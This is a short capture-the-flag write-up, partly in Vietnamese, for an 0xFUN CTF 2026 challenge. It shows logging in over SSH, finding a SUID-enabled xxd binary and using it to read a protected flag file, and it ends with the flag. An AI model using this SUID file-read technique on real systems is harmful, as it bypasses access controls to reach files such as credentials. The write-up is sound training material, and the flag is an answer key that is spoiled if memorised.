# Figure out whats hidden! - 0xFUN CTF 2026

## Category: OSINT / Misc

## Challenge Info

- **Description:** Figure out whats hidden!
- **Credentials:** `usr: Danger | pswd: password`
- **Connection:** `ssh -o StrictHostKeyChecking=no Danger@chall.0xfun.org -p41395`

## Solution

### Step 1: SSH vào server

```bash
ssh -o StrictHostKeyChecking=no Danger@chall.0xfun.org -p41395
# Password: password
```

### Step 2: Liệt kê file

```bash
Danger@challenge:~$ ls -la
total 28
dr-xr-xr-x 1 Danger   Danger   4096 Nov 17 04:44 .
drwxr-xr-x 1 root     root     4096 Nov 17 04:44 ..
-rw-r--r-- 1 Danger   Danger    220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 Danger   Danger   3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 Danger   Danger    807 Feb 25  2020 .profile
-rwx------ 1 noaccess noaccess   28 Nov 17 04:44 flag.txt
```

`flag.txt` thuộc sở hữu của user `noaccess` với permission `-rwx------` -> user `Danger` không thể đọc trực tiếp.

### Step 3: Tìm SUID binaries

```bash
Danger@challenge:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/xxd          <--- !
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

`/usr/bin/xxd` có SUID bit! Theo [GTFOBins](https://gtfobins.github.io/gtfobins/xxd/), `xxd` với SUID có thể đọc bất kỳ file nào trên hệ thống.

### Step 4: Đọc flag bằng xxd

```bash
Danger@challenge:~$ xxd /home/Danger/flag.txt | xxd -r
0xfun{Easy_Access_Granted!}
```

`xxd` chạy với quyền root (SUID) nên bypass được file permission. Pipe qua `xxd -r` để convert hex dump trở lại plaintext.

## Flag

```
0xfun{Easy_Access_Granted!}
```
